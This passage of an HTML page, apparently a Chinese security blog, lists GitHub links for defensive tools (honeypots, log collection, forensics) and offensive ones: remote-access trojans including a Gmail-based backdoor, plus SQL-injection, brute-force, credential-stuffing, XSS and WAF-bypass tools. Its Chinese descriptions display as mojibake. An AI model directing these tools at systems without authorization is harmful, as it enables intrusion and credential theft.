<h1 id="ç”²æ–¹å®‰å…¨å·¥ç¨‹å¸ˆç”Ÿå­˜æŒ‡å—"><a href="#ç”²æ–¹å®‰å…¨å·¥ç¨‹å¸ˆç”Ÿå­˜æŒ‡å—" class="headerlink" title="ç”²æ–¹å®‰å…¨å·¥ç¨‹å¸ˆç”Ÿå­˜æŒ‡å—"></a>ç”²æ–¹å®‰å…¨å·¥ç¨‹å¸ˆç”Ÿå­˜æŒ‡å—</h1><p>webç´¢å¼•åŠæ—¥å¿—æœç´¢å·¥å…·ï¼š<br><a href="https://github.com/thomaspatzke/WASE">https://github.com/thomaspatzke/WASE</a><br>å¼€æºæ—¥å¿—é‡‡é›†å™¨ï¼š<br><a href="https://github.com/wgliang/logcool">https://github.com/wgliang/logcool</a><br>æ‰«æCSç»“æ„çš„web debuger<br><a href="https://github.com/Kozea/wdb">https://github.com/Kozea/wdb</a><br>æ¢å¤sqliteæ•°æ®åº“åˆ é™¤æ³¨å†Œä¿¡æ¯ï¼š<br><a href="https://github.com/aramosf/recoversqlite/">https://github.com/aramosf/recoversqlite/</a><br>gpsæ¬ºéª—æ£€æµ‹å·¥å…·:<br><a href="https://github.com/zxsecurity/gpsnitch">https://github.com/zxsecurity/gpsnitch</a><br>åº”æ€¥å¤„ç½®å“åº”æ¡†æ¶:<br><a href="https://github.com/biggiesmallsAG/nightHawkResponse">https://github.com/biggiesmallsAG/nightHawkResponse</a><br>webå®‰å…¨å¼€å‘æŒ‡å—:<br><a href="https://github.com/FallibleInc/security-guide-for-developers">https://github.com/FallibleInc/security-guide-for-developers</a><br>å„ä¸ªçŸ¥åå‚å•†æ¼æ´æµ‹è¯•æŠ¥å‘Šæ¨¡æ¿ï¼š<br><a href="https://github.com/juliocesarfort/public-pentesting-reports">https://github.com/juliocesarfort/public-pentesting-reports</a><br>linuxä¸‹æ¶æ„ä»£ç æ£€æµ‹åŒ…ï¼š<br><a href="https://github.com/rfxn/linux-malware-detect">https://github.com/rfxn/linux-malware-detect</a><br>æ“ä½œç³»ç»Ÿè¿è¡ŒæŒ‡æ ‡å¯è§†åŒ–æ¡†æ¶ï¼š<br><a href="https://github.com/facebook/osquery">https://github.com/facebook/osquery</a><br>æ¶æ„ä»£ç åˆ†æç³»ç»Ÿï¼š<br><a href="https://github.com/cuckoosandbox/cuckoo">https://github.com/cuckoosandbox/cuckoo</a><br>å®šæœŸæœç´¢åŠå­˜å‚¨webåº”ç”¨ï¼š<br><a href="https://github.com/Netflix/Scumblr">https://github.com/Netflix/Scumblr</a><br>äº‹ä»¶å“åº”æ¡†æ¶ï¼š<br><a href="https://github.com/google/grr">https://github.com/google/grr</a><br>ç»¼åˆä¸»æœºç›‘æ§æ£€æµ‹å¹³å°ï¼š<br><a href="https://github.com/ossec/ossec-hids">https://github.com/ossec/ossec-hids</a><br>åˆ†å¸ƒå¼å®æ—¶æ•°å­—å–è¯ç³»ç»Ÿï¼š<br><a href="https://github.com/mozilla/mig">https://github.com/mozilla/mig</a><br>Microsoft &amp; Unix æ–‡ä»¶ç³»ç»ŸåŠç¡¬ç›˜å–è¯å·¥å…·ï¼š<br><a href="https://github.com/sleuthkit/sleuthkit">https://github.com/sleuthkit/sleuthkit</a></p>
<h1 id="èœœç½"><a href="#èœœç½" class="headerlink" title="èœœç½"></a>èœœç½</h1><p>SSHèœœç½ï¼š<br><a href="https://github.com/desaster/kippo">https://github.com/desaster/kippo</a><br>èœœç½é›†åˆèµ„æºï¼š<br><a href="https://github.com/paralax/awesome-honeypots">https://github.com/paralax/awesome-honeypots</a><br>kippoè¿›é˜¶ç‰ˆèœœç½ï¼š<br><a href="https://github.com/micheloosterhof/cowrie">https://github.com/micheloosterhof/cowrie</a><br>SMTP èœœç½ï¼š<br><a href="https://github.com/awhitehatter/mailoney">https://github.com/awhitehatter/mailoney</a><br>webåº”ç”¨ç¨‹åºèœœç½ï¼š<br><a href="https://github.com/mushorg/glastopf">https://github.com/mushorg/glastopf</a><br>æ•°æ®åº“èœœç½ï¼š<br><a href="https://github.com/jordan-wright/elastichoney">https://github.com/jordan-wright/elastichoney</a><br>webèœœç½ï¼š<br><a href="https://github.com/atiger77/Dionaea">https://github.com/atiger77/Dionaea</a></p>
<h1 id="è¿œæ§"><a href="#è¿œæ§" class="headerlink" title="è¿œæ§"></a>è¿œæ§</h1><p>ç”¨gmailå……å½“C&amp;CæœåŠ¡å™¨çš„åé—¨<br><a href="https://github.com/byt3bl33d3r/gcat">https://github.com/byt3bl33d3r/gcat</a><br>å¼€æºçš„è¿œæ§ï¼š<br><a href="https://github.com/UbbeLoL/uRAT">https://github.com/UbbeLoL/uRAT</a><br>c#è¿œæ§ï¼š<br><a href="https://github.com/hussein-aitlahcen/BlackHole">https://github.com/hussein-aitlahcen/BlackHole</a></p>
<h1 id="å·¥å…·åˆé›†"><a href="#å·¥å…·åˆé›†" class="headerlink" title="å·¥å…·åˆé›†"></a>å·¥å…·åˆé›†</h1><p><a href="https://github.com/torque59/Nosql-Exploitation-Framework">https://github.com/torque59/Nosql-Exploitation-Framework</a></p>
<p>(NoSQLæ‰«æ/çˆ†ç ´å·¥å…·)<br><a href="https://github.com/missDronio/blindy">https://github.com/missDronio/blindy</a><br>(MySQLç›²æ³¨çˆ†ç ´å·¥å…·)<br><a href="https://github.com/fengxuangit/Fox-scan">https://github.com/fengxuangit/Fox-scan</a><br>(åŸºäºSQLMAPçš„ä¸»åŠ¨å’Œè¢«åŠ¨èµ„æºå‘ç°çš„æ¼æ´æ‰«æå·¥å…·)<br><a href="https://github.com/NetSPI/PowerUpSQL">https://github.com/NetSPI/PowerUpSQL</a><br>(ç”¨äºSQL Serverå®¡è®¡çš„powershellè„šæœ¬)<br><a href="https://github.com/JohnTroony/Blisqy">https://github.com/JohnTroony/Blisqy</a><br>(ç”¨äºhttp headerä¸­çš„æ—¶é—´ç›²æ³¨çˆ†ç ´å·¥å…·ï¼Œä»…é’ˆå¯¹MySQL / MariaDB)<br><a href="https://github.com/ron190/jsql-injection">https://github.com/ron190/jsql-injection</a><br>(Javaç¼–å†™çš„SQLæ³¨å…¥å·¥å…·)<br><a href="https://github.com/Hadesy2k/sqliv">https://github.com/Hadesy2k/sqliv</a><br>(åŸºäºæœç´¢å¼•æ“çš„æ‰¹é‡SQLæ³¨å…¥æ¼æ´æ‰«æå™¨)<br><a href="https://github.com/s0md3v/sqlmate">https://github.com/s0md3v/sqlmate</a><br>(åœ¨sqlmapåŸºç¡€ä¸Šå¢åŠ äº†ç›®å½•æ‰«æï¼Œhashçˆ†ç ´ç­‰åŠŸèƒ½)<br><a href="https://github.com/m8r0wn/enumdb">https://github.com/m8r0wn/enumdb</a><br>(Mysysä»¥åŠMSSQLçˆ†ç ´è„±è£¤å·¥å…·)<br><a href="https://github.com/9tail123/wooscan">https://github.com/9tail123/wooscan</a><br>(æ‰¹é‡æŸ¥è¯¢ç½‘ç«™åœ¨ä¹Œäº‘æ˜¯å¦å­˜åœ¨å¿½ç•¥çš„sqlæ³¨å…¥æ¼æ´å¹¶è‡ªåŠ¨è°ƒç”¨sqlmapæµ‹è¯•)<br><a href="https://github.com/lijiejie/htpwdScan">https://github.com/lijiejie/htpwdScan</a><br>(ä¸€ä¸ªç®€å•çš„HTTPæš´åŠ›ç ´è§£ï¼Œæ’åº“æ”»å‡»è„šæœ¬)<br><a href="https://github.com/ysrc/F-Scrack">https://github.com/ysrc/F-Scrack</a><br>(å¯¹å„ç±»æœåŠ¡è¿›è¡Œå¼±å£ä»¤æ£€æµ‹çš„è„šæœ¬)<br><a href="https://github.com/Mebus/cupp">https://github.com/Mebus/cupp</a><br>(æ ¹æ®ç”¨æˆ·ä¹ æƒ¯ç”Ÿæˆå¼±å£ä»¤æ¢æµ‹å­—å…¸è„šæœ¬)<br><a href="https://github.com/netxfly/crack_ssh">https://github.com/netxfly/crack_ssh</a><br>(Goå†™çš„åç¨‹ç‰ˆçš„ssh \redis \ mongodbå¼±å£ä»¤ç ´è§£å·¥å…·)<br><a href="https://github.com/LandGrey/pydictor">https://github.com/LandGrey/pydictor</a><br>(æš´åŠ›ç ´è§£å­—å…¸å»ºç«‹å·¥å…·)<br><a href="https://github.com/shengqi158/weak_password_detect">https://github.com/shengqi158/weak_password_detect</a><br>(å¤šçº¿ç¨‹æ¢æµ‹å¼±å£ä»¤)<br><a href="https://github.com/s0md3v/Blazy">https://github.com/s0md3v/Blazy</a><br>(æ”¯æŒæµ‹è¯•CSRFï¼ŒClickjackingï¼ŒCloudflareå’ŒWAFçš„å¼±å£ä»¤æ¢æµ‹å™¨)<br><a href="https://github.com/MooseDojo/myBFF">https://github.com/MooseDojo/myBFF</a><br>(å¯¹CiscoVPNï¼ŒCitrix Gatewayç­‰å„ç±»æœåŠ¡è¿›è¡Œå¼±å£ä»¤æ£€æµ‹çš„è„šæœ¬)<br><a href="https://github.com/rapid7/IoTSeeker">https://github.com/rapid7/IoTSeeker</a><br>(ç‰©è”ç½‘è®¾å¤‡é»˜è®¤å¯†ç æ‰«ææ£€æµ‹å·¥å…·)<br><a href="https://github.com/shodan-labs/iotdb">https://github.com/shodan-labs/iotdb</a><br>(ä½¿ç”¨nmapæ‰«æIoTè®¾å¤‡)<br><a href="https://github.com/googleinurl/RouterHunterBR">https://github.com/googleinurl/RouterHunterBR</a><br>(è·¯ç”±å™¨è®¾å¤‡æ¼æ´æ‰«æåˆ©ç”¨)<br><a href="https://github.com/scu-igroup/telnet-scanner">https://github.com/scu-igroup/telnet-scanner</a><br>(TelnetæœåŠ¡å¯†ç æ’åº“)<br><a href="https://github.com/viraintel/OWASP-Nettacker">https://github.com/viraintel/OWASP-Nettacker</a><br>(è‡ªåŠ¨åŒ–ä¿¡æ¯æœé›†åŠæ¸—é€æµ‹è¯•å·¥å…·ï¼Œæ¯”è¾ƒé€‚ç”¨äºIoTæ‰«æ)<br><a href="https://github.com/threat9/routersploit">https://github.com/threat9/routersploit</a><br>(åµŒå…¥å¼è®¾å¤‡æ¼æ´æ‰«æåŠåˆ©ç”¨å·¥å…·)<br><a href="https://github.com/shawarkhanethicalhacker/BruteXSS">https://github.com/shawarkhanethicalhacker/BruteXSS</a><br>(ä¸€æ¬¾XSSæ‰«æå™¨ï¼Œå¯æš´åŠ›æ³¨å…¥å‚æ•°)<br><a href="https://github.com/1N3/XSSTracer">https://github.com/1N3/XSSTracer</a><br>(å°å‹XSSæ‰«æå™¨ï¼Œä¹Ÿå¯æ£€æµ‹CRLFï¼ŒXSSï¼Œç‚¹å‡»åŠ«æŒçš„)<br><a href="https://github.com/0x584A/fuzzXssPHP">https://github.com/0x584A/fuzzXssPHP</a><br>(PHPç‰ˆæœ¬çš„åå°„å‹xssæ‰«æ)<br><a href="https://github.com/chuhades/xss_scan">https://github.com/chuhades/xss_scan</a><br>(æ‰¹é‡æ‰«æXSSçš„pythonè„šæœ¬)<br><a href="https://github.com/BlackHole1/autoFindXssAndCsrf">https://github.com/BlackHole1/autoFindXssAndCsrf</a><br>(è‡ªåŠ¨åŒ–æ£€æµ‹é¡µé¢æ˜¯å¦å­˜åœ¨XSSå’Œè·¨ç«™è¯·æ±‚ä¼ªé€ æ¼æ´çš„æµè§ˆå™¨æ’ä»¶)<br><a href="https://github.com/shogunlab/shuriken">https://github.com/shogunlab/shuriken</a><br>(ä½¿ç”¨å‘½ä»¤è¡Œè¿›è¡ŒXSSæ‰¹é‡æ£€æµ‹)<br><a href="https://github.com/s0md3v/XSStrike">https://github.com/s0md3v/XSStrike</a><br>(å¯è¯†åˆ«å’Œç»•è¿‡WAFçš„XSSæ‰«æå·¥å…·)<br><a href="https://github.com/stamparm/DSXS">https://github.com/stamparm/DSXS</a><br>(æ”¯æŒGETï¼ŒPOSTæ–¹å¼çš„é«˜æ•ˆXSSæ‰«æå™¨)<br><a href="https://github.com/ysrc/xunfeng">https://github.com/ysrc/xunfeng</a><br>(ç½‘ç»œèµ„äº§è¯†åˆ«å¼•æ“ï¼Œæ¼æ´æ£€æµ‹å¼•æ“)<br><a href="https://github.com/laramies/theHarvester">https://github.com/laramies/theHarvester</a><br>(ä¼ä¸šè¢«æœç´¢å¼•æ“æ”¶å½•æ•æ„Ÿèµ„äº§ä¿¡æ¯ç›‘æ§è„šæœ¬ï¼šå‘˜å·¥é‚®ç®±ï¼Œå­åŸŸåï¼Œä¸»æŒäºº)<br><a href="https://github.com/x0day/Multisearch-v2">https://github.com/x0day/Multisearch-v2</a><br>(Bingï¼Œgoogleï¼Œ360ï¼Œzoomeye ç­‰æœç´¢å¼•æ“èšåˆæœç´¢ï¼Œå¯ç”¨äºå‘ç°ä¼ä¸šè¢«æœç´¢å¼•æ“æ”¶å½•çš„æ•æ„Ÿèµ„äº§ä¿¡æ¯)<br><a href="https://github.com/Ekultek/Zeus-Scanner">https://github.com/Ekultek/Zeus-Scanner</a><br>(èƒ½æˆæŠ“å–æœç´¢å¼•æ“éšè—çš„urlï¼Œå¹¶äº¤ç”±sqlmapï¼Œnmapæ‰«æ)<br><a href="https://github.com/0xbug/Biu-framework">https://github.com/0xbug/Biu-framework</a><br>(ä¼ä¸šå†…ç½‘åŸºç¡€æœåŠ¡å®‰å…¨æ‰«ææ¡†æ¶)<br><a href="https://github.com/metac0rtex/GitHarvester">https://github.com/metac0rtex/GitHarvester</a><br>(github Repoä¿¡æ¯æœé›†å·¥å…·)<br><a href="https://github.com/shengqi158/svnhack">https://github.com/shengqi158/svnhack</a><br>(.svnæ–‡ä»¶å¤¹æ³„æ¼åˆ©ç”¨å·¥å…·)<br><a href="https://github.com/repoog/GitPrey">https://github.com/repoog/GitPrey</a><br>(GitHubæ•æ„Ÿä¿¡æ¯æ‰«æå·¥å…·)<br><a href="https://github.com/0xbug/Hawkeye">https://github.com/0xbug/Hawkeye</a><br>(ä¼ä¸šèµ„äº§ï¼Œæ•æ„Ÿä¿¡æ¯GitHubæ³„éœ²ç›‘æ§ç³»ç»Ÿ)<br><a href="https://github.com/lianfeng30/githubscan">https://github.com/lianfeng30/githubscan</a><br>(æ ¹æ®ä¼ä¸šå…³é”®è¯è¿›è¡Œé¡¹ç›®æ£€ç´¢ä»¥åŠç›¸åº”æ•æ„Ÿæ–‡ä»¶å’Œæ–‡ä»¶å†…å®¹æ‰«æçš„å·¥å…·)<br><a href="https://github.com/UnkL4b/GitMiner">https://github.com/UnkL4b/GitMiner</a><br>(githubæ•æ„Ÿä¿¡æ¯æœç´¢å·¥å…·)<br><a href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a><br>( .gitæ–‡ä»¶å¤¹æ³„æ¼åˆ©ç”¨å·¥å…·)<br><a href="https://github.com/dxa4481/truffleHog">https://github.com/dxa4481/truffleHog</a><br>(GitHubæ•æ„Ÿä¿¡æ¯æ‰«æå·¥å…·ï¼ŒåŒ…æ‹¬æ£€æµ‹æäº¤ç­‰)<br><a href="https://github.com/1N3/Goohak">https://github.com/1N3/Goohak</a><br>(è‡ªåŠ¨åŒ–å¯¹æŒ‡å®šåŸŸåè¿›è¡ŒGoogle hackingæœç´¢å¹¶æ”¶é›†ä¿¡æ¯)<br><a href="https://github.com/UKHomeOffice/repo-security-scanner">https://github.com/UKHomeOffice/repo-security-scanner</a><br>(ç”¨äºæœç´¢gitçš„æ‰¿è¯ºä¸­çš„æ•æ„Ÿä¿¡æ¯ï¼Œä¾‹å¦‚å¯†ç ï¼Œç§é’¥ç­‰çš„å®¢æˆ·ç«¯å·¥å…·)<br><a href="https://github.com/FeeiCN/GSIL">https://github.com/FeeiCN/GSIL</a><br>(Githubæ•æ„Ÿä¿¡æ¯æ³„éœ²æ‰«æ)<br><a href="https://github.com/MiSecurity/x-patrol">https://github.com/MiSecurity/x-patrol</a><br>(Githubæ³„éœ²å·¡èˆªå·¥å…·)<br><a href="https://github.com/1N3/BlackWidow">https://github.com/1N3/BlackWidow</a><br>(Webç«™ç‚¹ä¿¡æ¯æœé›†å·¥å…·ï¼ŒåŒ…æ‹¬é‚®ç®±ï¼Œç”µè¯ç­‰ä¿¡æ¯)<br><a href="https://github.com/anshumanbh/git-all-secrets">https://github.com/anshumanbh/git-all-secrets</a><br>(é›†åˆå¤šä¸ªå¼€æºGitHubæ•æ„Ÿä¿¡æ¯æ‰«æçš„ä¼ä¸šä¿¡æ¯æ³„éœ²å·¡èˆªå·¥å…·)<br><a href="https://github.com/s0md3v/Photon">https://github.com/s0md3v/Photon</a><br>(å¯ä»¥æå–ç½‘å€ï¼Œç”µå­é‚®ä»¶ï¼Œæ–‡ä»¶ï¼Œç½‘ç«™å¸æˆ·ç­‰çš„é«˜é€Ÿçˆ¬è™«)<br><a href="https://github.com/he1m4n6a/findWebshell">https://github.com/he1m4n6a/findWebshell</a><br>(ä¸€æ¬¾ç®€å•çš„webshellæ£€æµ‹å·¥å…·)<br><a href="https://github.com/Tencent/HaboMalHunter">https://github.com/Tencent/HaboMalHunter</a><br>(å“ˆå‹ƒåˆ†æç³»ç»Ÿï¼ŒLINUXç³»ç»Ÿç—…æ¯’åˆ†æåŠå®‰å…¨æ£€æµ‹)<br><a href="https://github.com/PlagueScanner/PlagueScanner">https://github.com/PlagueScanner/PlagueScanner</a><br>(ä½¿ç”¨pythonå®ç°çš„é›†æˆClamAVï¼ŒESETï¼ŒBitdefenderçš„åç—…æ¯’å¼•æ“)<br><a href="https://github.com/nbs-system/php-malware-finder">https://github.com/nbs-system/php-malware-finder</a><br>(ä¸€æ¬¾é«˜æ•ˆç‡PHP-webshellæ‰«æå·¥å…·)<br><a href="https://github.com/emposha/PHP-Shell-Detector/">https://github.com/emposha/PHP-Shell-Detector/</a><br>(æµ‹è¯•æ•ˆç‡é«˜è¾¾99%çš„webshellæ£€æµ‹å·¥å…·)<br><a href="https://github.com/erevus-cn/scan_webshell">https://github.com/erevus-cn/scan_webshell</a><br>(ä¸€æ¬¾ç®€æ´çš„çš„Webshellæ‰«æå·¥å…·)<br><a href="https://github.com/emposha/Shell-Detector">https://github.com/emposha/Shell-Detector</a><br>(Webshellæ‰«æå·¥å…·ï¼Œæ”¯æŒphp / perl / asp / aspx webshellæ‰«æ)<br><a href="https://github.com/m4rco-/dorothy2">https://github.com/m4rco-/dorothy2</a><br>(ä¸€æ¬¾æœ¨é©¬ï¼Œåƒµå°¸ç½‘ç»œåˆ†ææ¡†æ¶)<br><a href="https://github.com/droidefense/engine">https://github.com/droidefense/engine</a><br>(é«˜çº§å®‰å“æœ¨é©¬ç—…æ¯’åˆ†ææ¡†æ¶)<br><a href="https://github.com/lcatro/network_backdoor_scanner">https://github.com/lcatro/network_backdoor_scanner</a><br>(åŸºäºç½‘ç»œæµé‡çš„å†…ç½‘æ¢æµ‹æ¡†æ¶)<br><a href="https://github.com/fdiskyou/hunter">https://github.com/fdiskyou/hunter</a><br>(è°ƒç”¨Windows APIæšä¸¾ç”¨æˆ·ç™»å½•ä¿¡æ¯)<br><a href="https://github.com/BlackHole1/WebRtcXSS">https://github.com/BlackHole1/WebRtcXSS</a><br>(è‡ªåŠ¨åŒ–åˆ©ç”¨XSSå…¥ä¾µå†…ç½‘)<br><a href="https://github.com/ring04h/wyportmap">https://github.com/ring04h/wyportmap</a><br>(ç›®æ ‡ç«¯å£æ‰«æ+ç³»ç»ŸæœåŠ¡æŒ‡çº¹è¯†åˆ«)<br><a href="https://github.com/ring04h/weakfilescan">https://github.com/ring04h/weakfilescan</a><br>(åŠ¨æ€å¤šçº¿ç¨‹æ•æ„Ÿä¿¡æ¯æ³„éœ²æ£€æµ‹å·¥å…·)<br><a href="https://github.com/EnableSecurity/wafw00f">https://github.com/EnableSecurity/wafw00f</a><br>(WAFäº§å“æŒ‡çº¹è¯†åˆ«)<br><a href="https://github.com/rbsec/sslscan">https://github.com/rbsec/sslscan</a><br>(SSLç±»å‹è¯†åˆ«)<br><a href="https://github.com/urbanadventurer/whatweb">https://github.com/urbanadventurer/whatweb</a><br>(WebæŒ‡çº¹è¯†åˆ«)<br><a href="https://github.com/tanjiti/FingerPrint">https://github.com/tanjiti/FingerPrint</a><br>(Webåº”ç”¨æŒ‡çº¹è¯†åˆ«)<br><a href="https://github.com/nanshihui/Scan-T">https://github.com/nanshihui/Scan-T</a><br>(ç½‘ç»œçˆ¬è™«å¼æŒ‡çº¹è¯†åˆ«)<br><a href="https://github.com/OffensivePython/Nscan">https://github.com/OffensivePython/Nscan</a><br>(åŸºäºMasscanå’ŒZmapçš„ç½‘ç»œæ‰«æå™¨)<br><a href="https://github.com/ywolf/F-NAScan">https://github.com/ywolf/F-NAScan</a><br>(ç½‘ç»œèµ„äº§ä¿¡æ¯æ‰«æï¼ŒICMPå­˜æ´»æ¢æµ‹ï¼Œç«¯å£æ‰«æï¼Œç«¯å£æŒ‡çº¹æœåŠ¡è¯†åˆ«)<br><a href="https://github.com/ywolf/F-MiddlewareScan">https://github.com/ywolf/F-MiddlewareScan</a><br>(ä¸­é—´ä»¶æ‰«æ)<br><a href="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a><br>(webè·¯å¾„æ”¶é›†ä¸æ‰«æ)<br><a href="https://github.com/x0day/bannerscan">https://github.com/x0day/bannerscan</a><br>(Cæ®µæ¨ªå¹…ä¸è·¯å¾„æ‰«æ)<br><a href="https://github.com/RASSec/RASscan">https://github.com/RASSec/RASscan</a><br>(ç«¯å£æœåŠ¡æ‰«æ)<br><a href="https://github.com/3xp10it/bypass_waf">https://github.com/3xp10it/bypass_waf</a><br>(wafè‡ªåŠ¨æš´ç ´)<br><a href="https://github.com/3xp10it/xcdn">https://github.com/3xp10it/xcdn</a><br>(å°è¯•æ‰¾å‡ºcdnèƒŒåçš„çœŸå®ip)<br><a href="https://github.com/Xyntax/BingC">https://github.com/Xyntax/BingC</a><br>(åŸºäºBingæœç´¢å¼•æ“çš„Cæ®µ/æ—ç«™æŸ¥è¯¢ï¼Œå¤šçº¿ç¨‹ï¼Œæ”¯æŒAPI)<br><a href="https://github.com/Xyntax/DirBrute">https://github.com/Xyntax/DirBrute</a><br>(å¤šçº¿ç¨‹WEBç›®å½•çˆ†ç ´å·¥å…·)<br><a href="https://github.com/zer0h/httpscan">https://github.com/zer0h/httpscan</a><br>(ä¸€ä¸ªçˆ¬è™«å¼çš„ç½‘æ®µWebä¸»æœºå‘ç°å°å·¥å…·)<br><a href="https://github.com/lietdai/doom">https://github.com/lietdai/doom</a><br>(Thornä¸Šå®ç°çš„åˆ†å¸ƒå¼ä»»åŠ¡åˆ†å‘çš„ipç«¯å£æ¼æ´æ‰«æå™¨)<br><a href="https://github.com/chichou/grab.js">https://github.com/chichou/grab.js</a><br>(ç±»ä¼¼zgrabçš„å¿«é€ŸTCPæŒ‡çº¹æŠ“å–è§£æå·¥å…·ï¼Œæ”¯æŒæ›´å¤šåè®®)<br><a href="https://github.com/Nitr4x/whichCDN">https://github.com/Nitr4x/whichCDN</a><br>(CDNè¯†åˆ«ï¼Œæ£€æµ‹)<br><a href="https://github.com/secfree/bcrpscan">https://github.com/secfree/bcrpscan</a><br>(åŸºäºçˆ¬è™«çš„webè·¯å¾„æ‰«æå™¨)<br><a href="https://github.com/mozilla/ssh_scan">https://github.com/mozilla/ssh_scan</a><br>(æœåŠ¡å™¨sshé…ç½®ä¿¡æ¯æ‰«æ)<br><a href="https://github.com/18F/domain-scan">https://github.com/18F/domain-scan</a><br>(é’ˆå¯¹åŸŸååŠå…¶å­åŸŸåçš„èµ„äº§æ•°æ®æ£€æµ‹/æ‰«æï¼ŒåŒ…æ‹¬http / httpsæ£€æµ‹ç­‰)<br><a href="https://github.com/ggusoft/inforfinder">https://github.com/ggusoft/inforfinder</a><br>(åŸŸåèµ„äº§æ”¶é›†åŠæŒ‡çº¹è¯†åˆ«å·¥å…·)<br><a href="https://github.com/boy-hack/gwhatweb">https://github.com/boy-hack/gwhatweb</a><br>(CMSè¯†åˆ«python geventå®ç°)<br><a href="https://github.com/Mosuan/FileScan">https://github.com/Mosuan/FileScan</a><br>(æ•æ„Ÿæ–‡ä»¶æ‰«æ/äºŒæ¬¡åˆ¤æ–­é™ä½è¯¯æŠ¥ç‡/æ‰«æå†…å®¹è§„åˆ™åŒ–/å¤šç›®å½•æ‰«æ)<br><a href="https://github.com/Xyntax/FileSensor">https://github.com/Xyntax/FileSensor</a><br>(åŸºäºçˆ¬è™«çš„åŠ¨æ€æ•æ„Ÿæ–‡ä»¶æ¢æµ‹å·¥å…·)<br><a href="https://github.com/deibit/cansina">https://github.com/deibit/cansina</a><br>(webè·¯å¾„æ‰«æå·¥å…·)<br><a href="https://github.com/0xbug/Howl">https://github.com/0xbug/Howl</a><br>(ç½‘ç»œè®¾å¤‡webæœåŠ¡æŒ‡çº¹æ‰«æä¸æ£€ç´¢)<br><a href="https://github.com/mozilla/cipherscan">https://github.com/mozilla/cipherscan</a><br>(ç›®æ ‡ä¸»æœºæœåŠ¡sslç±»å‹è¯†åˆ«)<br><a href="https://github.com/xmendez/wfuzz">https://github.com/xmendez/wfuzz</a><br>(Webåº”ç”¨fuzzå·¥å…·ï¼Œæ¡†æ¶ï¼ŒåŒæ—¶å¯ç”¨äºwebè·¯å¾„/æœåŠ¡æ‰«æ)<br><a href="https://github.com/s0md3v/Breacher">https://github.com/s0md3v/Breacher</a><br>(å¤šçº¿ç¨‹çš„åå°è·¯å¾„æ‰«æå™¨ï¼Œä¹Ÿå¯ç”¨äºå‘ç°é‡å®šå‘æ¼æ´åæ‰§è¡Œ)<br><a href="https://github.com/ztgrace/changeme">https://github.com/ztgrace/changeme</a><br>(å¼±å£ä»¤æ‰«æå™¨ï¼Œä¸ä»…æ”¯æŒæ™®é€šç™»å½•é¡µï¼Œä¹Ÿæ”¯æŒsshï¼Œmongodbç­‰ç»„ä»¶)<br><a href="https://github.com/medbenali/CyberScan">https://github.com/medbenali/CyberScan</a><br>(æ¸—é€æµ‹è¯•è¾…åŠ©å·¥å…·ï¼Œæ”¯æŒåˆ†ææ•°æ®åŒ…ï¼Œè§£ç ï¼Œç«¯å£æ‰«æï¼ŒIPåœ°å€åˆ†æç­‰)<br><a href="https://github.com/m0nad/HellRaiser">https://github.com/m0nad/HellRaiser</a><br>(åŸºäºnmapçš„æ‰«æå™¨ï¼Œä¸cveæ¼æ´å…³è”)<br><a href="https://github.com/scipag/vulscan">https://github.com/scipag/vulscan</a><br>(åŸºäºnmapçš„é«˜çº§æ¼æ´æ‰«æå™¨ï¼Œå‘½ä»¤è¡Œç¯å¢ƒä½¿ç”¨)<br><a href="https://github.com/jekyc/wig">https://github.com/jekyc/wig</a><br>(webåº”ç”¨ä¿¡æ¯æœé›†å·¥å…·)<br><a href="https://github.com/eldraco/domain_analyzer">https://github.com/eldraco/domain_analyzer</a><br>(å›´ç»•webæœåŠ¡çš„åŸŸåè¿›è¡Œä¿¡æ¯æ”¶é›†å’Œâ€œåŸŸä¼ é€â€ç­‰æ¼æ´æ‰«æï¼Œä¹Ÿæ”¯æŒé’ˆå¯¹èƒŒåçš„æœåŠ¡å™¨ç«¯å£æ‰«æç­‰)<br><a href="https://github.com/cloudtracer/paskto">https://github.com/cloudtracer/paskto</a><br>(åŸºäºNiktoæ‰«æè§„åˆ™çš„è¢«åŠ¨å¼è·¯å¾„æ‰«æä»¥åŠä¿¡æ¯çˆ¬è™«)<br><a href="https://github.com/zerokeeper/WebEye">https://github.com/zerokeeper/WebEye</a><br>(å¿«é€Ÿè¯†åˆ«WEBæœåŠ¡å™¨ç±»å‹ï¼ŒCMSç±»å‹ï¼ŒWAFç±»å‹ï¼ŒWHOISä¿¡æ¯ï¼Œä»¥åŠè¯­è¨€æ¡†æ¶)<br><a href="https://github.com/m3liot/shcheck">https://github.com/m3liot/shcheck</a><br>(ç”¨äºæ£€æŸ¥webæœåŠ¡çš„http headerçš„å®‰å…¨æ€§)<br><a href="https://github.com/aipengjie/sensitivefilescan">https://github.com/aipengjie/sensitivefilescan</a><br>(ä¸€æ¬¾é«˜æ•ˆå¿«æ·çš„æ•æ„Ÿæ–‡ä»¶æ‰«æå·¥å…·)<br><a href="https://github.com/fnk0c/cangibrina">https://github.com/fnk0c/cangibrina</a><br>(é€šè¿‡å­—å…¸ç©·ä¸¾ï¼Œgoogleï¼Œrobots.txtç­‰é€”å¾„çš„è·¨å¹³å°åå°ç®¡ç†è·¯å¾„æ‰«æå™¨)<br><a href="https://github.com/n4xh4ck5/CMSsc4n">https://github.com/n4xh4ck5/CMSsc4n</a><br>(å¸¸è§„CMSæŒ‡çº¹è¯†åˆ«)<br><a href="https://github.com/Ekultek/WhatWaf">https://github.com/Ekultek/WhatWaf</a><br>(WAFæŒ‡çº¹è¯†åˆ«åŠè‡ªåŠ¨åŒ–ç»•è¿‡å·¥å…·)<br><a href="https://github.com/dzonerzy/goWAPT">https://github.com/dzonerzy/goWAPT</a><br>(ç½‘ç»œåº”ç”¨æ¨¡ç³Šå·¥å…·ï¼Œæ¡†æ¶ï¼ŒåŒæ—¶å¯ç”¨äºç½‘ç»œè·¯å¾„/æœåŠ¡æ‰«æ)<br><a href="https://github.com/blackye/webdirdig">https://github.com/blackye/webdirdig</a><br>(webæ•æ„Ÿç›®å½•/ä¿¡æ¯æ³„æ¼æ‰«æè„šæœ¬)<br><a href="https://github.com/GitHackTools/BillCipher">https://github.com/GitHackTools/BillCipher</a><br>(ç”¨äºç½‘ç«™æˆ–IPåœ°å€çš„ä¿¡æ¯æ”¶é›†å·¥å…·)<br><a href="https://github.com/boy-hack/w8fuckcdn">https://github.com/boy-hack/w8fuckcdn</a><br>(é€šè¿‡æ‰«æå…¨ç½‘è·å¾—çœŸå®IPçš„è‡ªåŠ¨åŒ–ç¨‹åº)<br><a 